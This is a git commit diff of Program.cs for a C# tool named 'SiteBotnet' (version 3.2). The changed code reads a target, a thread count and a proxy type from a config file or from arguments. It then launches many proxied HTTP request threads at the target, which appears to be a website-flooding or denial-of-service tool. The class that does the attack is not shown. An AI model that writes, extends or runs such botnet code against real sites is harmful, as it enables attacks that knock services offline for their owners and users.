9fb545195cbaba966eec8af4fa04d2e053844696
ShiningLea <49339966+AnErrupTion@users.noreply.github.com>
2019-10-05 20:14:17 +0200

    3.2

--- Program.cs
+++ Program.cs
@@ -1,41 +1,47 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
-using Leaf.xNet;
 using System.IO;
-using Leaf.xNet.Services.Cloudflare;
-using System.Net.NetworkInformation;
-using System.Threading;
 using ConfigParser;
 
 namespace SiteBotnet3
 {
     class Program
     {
-        private static string AppName = "SiteBotnet";
-        private static string AppVersion = "3.1";
+        private static readonly string AppName = "SiteBotnet";
+        private static readonly string AppVersion = "3.2";
 
         static void Main(string[] args)
         {
-            Parser p = new Parser("config.txt");
-            if (!File.Exists("proxies.txt")) File.WriteAllText("proxies.txt", "");
-
-            string Target = p.ReadConfig("Target").ToString().Split('=')[1].Replace(" ", "");
-            string Keyword = p.ReadConfig("Keyword").ToString().Split('=')[1].Replace(" ", "");
-            int Threads = Convert.ToInt32(p.ReadConfig("Threads").ToString().Split('=')[1].Replace(" ", ""));
-            string ProxyType = p.ReadConfig("ProxyType").ToString().Split('=')[1].Replace(" ", "");
+            string Target;
+            int Threads;
+            string ProxyType;
             List<string> ProxyList = new List<string>(File.ReadAllLines("proxies.txt"));
 
+            if (args.Length == 0)
+            {
+                Parser p = new Parser("config.txt");
+                Target = p.ReadConfig("Target").ToString().Split('=')[1].Replace(" ", "");
+                Threads = Convert.ToInt32(p.ReadConfig("Threads").ToString().Split('=')[1].Replace(" ", ""));
+                ProxyType = p.ReadConfig("ProxyType").ToString().Split('=')[1].Replace(" ", "");
+            }
+            else
+            {
+                Target = args[0];
+                Threads = Convert.ToInt32(args[1]);
+                ProxyType = args[2];
+            }
+
+            if (!File.Exists("proxies.txt")) File.WriteAllText("proxies.txt", "");
             Console.Title = AppName + " v" + AppVersion;
 
             for (int i = 0; i < Threads; i++)
             {
                 Requests req = new Requests("[ThreadHttp-" + i + "]");
                 req.SetTarget(Target);
-                req.SetKeyword(Keyword);
                 req.SetThreads(Threads);
                 req.SetProxyType(ProxyType);
                 req.SetProxyList(ProxyList);
-                req.Start();
+                req.Start(true);
             }
 
             return;
